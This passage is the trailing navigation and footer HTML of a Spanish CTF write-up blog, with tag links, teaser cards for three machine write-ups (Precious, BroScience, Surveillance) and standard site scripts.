class="panel-heading">Etiquetas populares</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">CTF</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/easy/">Easy</a> <a class="post-tag" href="/tags/medium/">Medium</a> <a class="post-tag" href="/tags/active-directory/">Active Directory</a> <a class="post-tag" href="/tags/commandinjection/">CommandInjection</a> <a class="post-tag" href="/tags/sudoers/">Sudoers</a> <a class="post-tag" href="/tags/cache-deception/">Cache Deception</a> <a class="post-tag" href="/tags/cracking-passwords/">Cracking Passwords</a> <a class="post-tag" href="/tags/cracking/">Cracking</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contenido</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4 mt-5"><div id="related-posts" class="mb-2 mb-sm-4"><h3 class="pt-2 mb-4 ml-1" data-toc-skip>Lecturas adicionales</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/writeup-precious/"><div class="card-body"> <em class="small" data-ts="1669525200" data-df="DD/MM/YYYY" > 27/11/2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Precious Writeup</h3><div class="text-muted small"><p> En esta máquina veremos cómo se acontece un RCE en base a un apartado donde podemos subir archivos, inyectamos comandos para entrar en la máquina y abusamos del privilegio de sudoers para obtener s...</p></div></div></a></div><div class="card"> <a href="/posts/writeup-broscience/"><div class="card-body"> <em class="small" data-ts="1673240400" data-df="DD/MM/YYYY" > 09/01/2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>BroScience Writeup</h3><div class="text-muted small"><p> En esta máquina veremos un LFI(Local File Inclusion) y vamos a bypassear un WAF para efectuar el LFI. Subiremos un php malicioso para ejecutarnos una reverse shell y también obtendremos acceso a la...</p></div></div></a></div><div class="card"> <a href="/posts/Writeup-Surveillance/"><div class="card-body"> <em class="small" data-ts="1702702800" data-df="DD/MM/YYYY" > 16/12/2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Surveillance Writeup</h3><div class="text-muted small"><p> Reconocimiento Inicialmente escaneo los puertos abiertos con Nmap, empleando ciertos parámetros para acelerar el escaneo ya que estamos en entornos totalmente controlados. 1 2 3 4 5 6 7 8 9 10 11...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"><div class="btn btn-outline-primary disabled" prompt="Anterior"><p>-</p></div><a href="/posts/writeup-precious/" class="btn btn-outline-primary" prompt="Nuevo"><p>Precious Writeup</p></a></div></div></div></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Etiquetas populares</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/ctf/">CTF</a> <a class="post-tag" href="/tags/linux/">Linux</a> <a class="post-tag" href="/tags/easy/">Easy</a> <a class="post-tag" href="/tags/medium/">Medium</a> <a class="post-tag" href="/tags/active-directory/">Active Directory</a> <a class="post-tag" href="/tags/commandinjection/">CommandInjection</a> <a class="post-tag" href="/tags/sudoers/">Sudoers</a> <a class="post-tag" href="/tags/cache-deception/">Cache Deception</a> <a class="post-tag" href="/tags/cracking-passwords/">Cracking Passwords</a> <a class="post-tag" href="/tags/cracking/">Cracking</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><footer><div class="container pl-lg-4 pr-lg-4"><div class="d-flex justify-content-between align-items-center text-muted ml-md-3 mr-md-3"><div class="footer-left"><p class="mb-0"> © 2024 <a href="https://twitter.com/AngelMiguel3023">miguel3023</a>. <span data-toggle="tooltip" data-placement="top" title="Salvo que se indique explícitamente, las entradas de este blog están licenciadas bajo la Creative Commons Attribution 4.0 International (CC BY 4.0) License por el autor.">Algunos derechos reservados.</span></p></div><div class="footer-right"><p class="mb-0"> Hecho con <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> usando el tema <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> .</p></div></div></div></footer><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">Hay una nueva versión de contenido disponible.</p><button type="button" class="btn btn-primary" aria-label="Update"> Actualizar </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">¡Oops! No se encuentran resultados.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/es.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
